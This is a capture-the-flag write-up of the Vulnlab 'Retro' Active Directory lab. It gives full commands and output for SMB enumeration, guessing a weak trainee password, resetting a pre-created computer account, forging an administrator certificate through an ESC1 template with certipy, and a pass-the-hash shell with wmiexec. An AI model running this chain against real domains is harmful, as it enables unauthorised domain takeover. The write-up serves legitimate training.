---
title: "[Vulnlab] Retro"
date: 2025-07-25 15:00:00 -500 
categories: [Vulnlab,CTF]
tags: [AD,redteam,hacking,ctf,vulnlab]
author: Christoph K
---

# Introducktion

### Hint:


`Root`
Look into pre-created computer accounts (https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)

Enumerate certificate templates

![Retro](assets/img/vulnlab/retro/01.png)




# Portscan


```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-27 14:16:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-27T13:52:00
| Not valid after:  2026-07-27T13:52:00
| MD5:   d082:f2da:84f1:dd8a:4fb0:7fd4:5175:c0e4
| SHA-1: fb61:eac4:e8b9:c826:8497:5677:248c:9eca:dbdb:c4a2
| -----BEGIN CERTIFICATE-----
gsEmBK7Y6LRKuA
| NIg6UJnd0eFNzXEkn+4At8d/Me8MPudj0v/Kb0DXlBtrEg==
|_-----END CERTIFICATE-----

445/tcp   open  microsoft-ds? syn-ack ttl 127

464/tcp   open  kpasswd5?     syn-ack ttl 127

593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0

636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-27T13:52:00
| Not valid after:  2026-07-27T13:52:00
| MD5:   d082:f2da:84f1:dd8a:4fb0:7fd4:5175:c0e4
| SHA-1: fb61:eac4:e8b9:c826:8497:5677:248c:9eca:dbdb:c4a2
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAfA/ur9Rr8ZKQAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjUwNzI3MTM1MjAwWhcNMjYwNzI3MTM1
| MjAwWjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAKlPyb9wnLLSwK6eocGCXrHAqutIcjmVFI81Wrj7UrgptDSE
| 9dkSgObyCgW2byJrnFNy6S2CCaYtvVCALUABTOMzG6MdtmWq3TPxO+QUJsUY9axv
| y+5AUrbH7qrJBZK9YqPlC1PlOJYpeaxw/t5HM2y5683ePyniZlySzzo87pqLY9PP

| NIg6UJnd0eFNzXEkn+4At8d/Me8MPudj0v/Kb0DXlBtrEg==
|_-----END CERTIFICATE-----

3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-27T13:52:00
| Not valid after:  2026-07-27T13:52:00
| MD5:   d082:f2da:84f1:dd8a:4fb0:7fd4:5175:c0e4
| SHA-1: fb61:eac4:e8b9:c826:8497:5677:248c:9eca:dbdb:c4a2
| -----BEGIN CERTIFICATE-----
|
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-27T13:52:00
| Not valid after:  2026-07-27T13:52:00
| MD5:   d082:f2da:84f1:dd8a:4fb0:7fd4:5175:c0e4
| SHA-1: fb61:eac4:e8b9:c826:8497:5677:248c:9eca:dbdb:c4a2
| -----BEGIN CERTIFICATE-----
| 
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

```

## Checking SMB Access

- Able to see shares with `anonymous`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# nxc smb retro.vl -u 'anonymous' -p '' --shares                                                                    
SMB         10.10.116.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.10.116.138   445    DC               [+] retro.vl\anonymous: (Guest)
SMB         10.10.116.138   445    DC               [*] Enumerated shares
SMB         10.10.116.138   445    DC               Share           Permissions     Remark
SMB         10.10.116.138   445    DC               -----           -----------     ------
SMB         10.10.116.138   445    DC               ADMIN$                          Remote Admin
SMB         10.10.116.138   445    DC               C$                              Default share
SMB         10.10.116.138   445    DC               IPC$            READ            Remote IPC
SMB         10.10.116.138   445    DC               NETLOGON                        Logon server share 
SMB         10.10.116.138   445    DC               Notes                           
SMB         10.10.116.138   445    DC               SYSVOL                          Logon server share 
SMB         10.10.116.138   445    DC               Trainees        READ            
                                                                                                             
```
- Connect to share and and get the files

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# smbclient //retro.vl/Trainees -U anonymous

Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 24 04:58:43 2023
  ..                                DHS        0  Wed Jul 26 16:54:14 2023
  Important.txt                       A      288  Mon Jul 24 05:00:13 2023

                6261499 blocks of size 4096. 2230973 blocks available
smb: \> get important.txt
getting file \important.txt of size 288 as important.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit

```

- Reading the file

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# cat important.txt         
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins                                                                                                                                                                                                 

```

### Enumerating user

- Checking all users with `rid-brute`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─#  nxc smb retro.vl -u 'guest' -p '' --rid-brute    
SMB         10.10.116.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.10.116.138   445    DC               [+] retro.vl\guest: 
SMB         10.10.116.138   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.116.138   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.10.116.138   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.10.116.138   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.10.116.138   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.10.116.138   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.10.116.138   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.10.116.138   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.10.116.138   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.10.116.138   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.10.116.138   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.10.116.138   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.10.116.138   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.116.138   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.116.138   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.116.138   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.10.116.138   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.10.116.138   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.116.138   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.116.138   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.116.138   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.116.138   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.116.138   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.116.138   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.116.138   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.116.138   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.116.138   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.116.138   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.116.138   445    DC               1109: RETRO\tblack (SidTypeUser)
                                                                                            
```

- Using `trainee:trainee` to get access to the `trainee` share

```bash
└─# smbclient //retro.vl/notes -U trainee         
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 24 05:03:16 2023
  ..                                DHS        0  Wed Jul 26 16:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 05:05:56 2023

                6261499 blocks of size 4096. 2888669 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \> exit
                     
```

- Read the next note

```bash
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James  
```

### Checking pre created computer accounts

- Check if there is a pre created computer account via `impacket-smbclient`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# impacket-smbclient retro.vl/banking\$:banking@10.10.116.138                
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000199 - STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT - The account used is a computer account. Use your global user account or local user account to access this server.
                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/vulnlab/retro
```

[TrustedSec | Diving into Pre-Created Computer Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)

- STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

### Reset password from computer account

- Reset the password via `changepasswd`

```bash
                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# impacket-changepasswd retro.vl/BANKING\$:banking@10.10.116.138 -altuser trainee -altpass trainee -newpass Start1234!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\trainee
[*] Password was changed successfully.
                                              
```

## Privilege Escalation via certipy

- searching for privilege escalation possibility via `certipy`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# certipy-ad find \
-u 'banking$'@retro.vl -p 'Start1234!' \
-dc-ip 10.10.116.138 -text \
-enabled
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250727215358_Certipy.txt'
[*] Wrote text output to '20250727215358_Certipy.txt'
                                                       
```

### ESC1

- Found vulnerability for ESC1

```bash
				Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

### Forging a certificate for administrator via `RetroClients` template

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# certipy-ad req \
    -u 'banking$@retro.vl' -p 'Start1234!' \
    -dc-ip '10.10.69.218' -target 'dc.retro.vl' -dns 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' \
    -upn 'administrator@retro.vl' -key-size 4096 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@retro.vl'
    DNS Host Name: 'dc.retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_dc.pfx'
[*] Wrote certificate and private key to 'administrator_dc.pfx'
                                                                      
```

### Login with administrator tgt

```bash
──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# certipy-ad auth -pfx administrator_dc.pfx -dc-ip 10.10.69.218           
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN DNS Host Name: 'dc.retro.vl'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'administrator@retro.vl' (administrator@retro.vl)
    [1] DNS Host Name: 'dc.retro.vl' (dc$@retro.vl)
> 0
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
                                                                                                                
```

- Using the hash for login via `wmiexec`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/retro]
└─# impacket-wmiexec  administrator@10.10.69.218 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
retro\administrator

C:\>cd Users/Administrator/Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 047C-7682

 Directory of C:\Users\Administrator\Desktop

07/25/2023  12:37 PM    <DIR>          .
07/23/2023  01:48 PM    <DIR>          ..
07/25/2023  12:38 PM                36 root.txt
               1 File(s)             36 bytes
               2 Dir(s)   9,133,621,248 bytes free

C:\Users\Administrator\Desktop>type root.txt
VLRredacted}

```

rootflag: `VL{Redacted}`

# Conclusion

Very important to learn about the vulnerability with `pre-created` computer accounts! 
[TrustedSec | Diving into Pre-Created Computer Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)

We were able to use the `banking$` computer account for initial access and also for `privilege escalation` via `ESC1`. 

